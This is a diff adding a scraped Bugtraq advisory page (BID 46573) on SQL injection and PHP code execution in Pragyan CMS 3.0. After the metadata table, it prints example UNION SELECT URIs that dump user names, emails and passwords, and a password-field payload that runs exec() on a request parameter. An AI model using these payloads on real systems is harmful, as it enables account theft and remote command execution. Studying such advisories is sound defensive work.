@@ -1,0 +1,98 @@
+#SpeeDr00t@Black Falcon<br>#bid46573<p><b><span style="font-size: 18pt;">Pragyan CMS SQL Injection and PHP Code Execution Vulnerabilities</span></b></p><br><br><a href="http://www.securityfocus.com/bid/46573/info">info</a><br><a href="http://www.securityfocus.com/bid/46573/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/46573/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/46573/solution">solution</a><br><a href="http://www.securityfocus.com/bid/46573/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				46573
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Feb 25 2011 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Feb 25 2011 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Abhishek Lyall
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					Pragyan CMS Pragyan CMS  3.0 rev 274<br/>
+					
+				
+					Pragyan CMS Pragyan CMS  3.0<br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	The following example URIs and input are available:<br/><br/>SQL-injection:<br/><br/> http://www.example.com/+view&amp;amp;thread_id=-1 UNION ALL SELECT null,null,null,null,concat(unhex(Hex(cast(@@version as char)))),null,null,null--<br/><br/>http://www.example.com/+view&amp;amp;thread_id=-1 UNION ALL SELECT null,null,null,null,(SELECT concat(0x7e,0x27,unhex(Hex(cast(pragyanV3_users.user_id as char))),0x3a,unhex(Hex(cast(pragyanV3_users.user_name as char))),0x3a,unhex(Hex(cast(pragyanV3_users.user_email as char))),0x3a,unhex(Hex(cast(pragyanV3_users.user_password as char))),0x3a,unhex(Hex(cast(pragyanV3_users.user_fullname as char))),0x27,0x7e) FROM `pragyan11`.pragyanV3_users LIMIT 0,1),null,null,null--<br/><br/>PHP code-execution:<br/><br/>password : ");echo exec($_GET"a");echo ("
+	
+		<ul>
+</ul>
+</div>
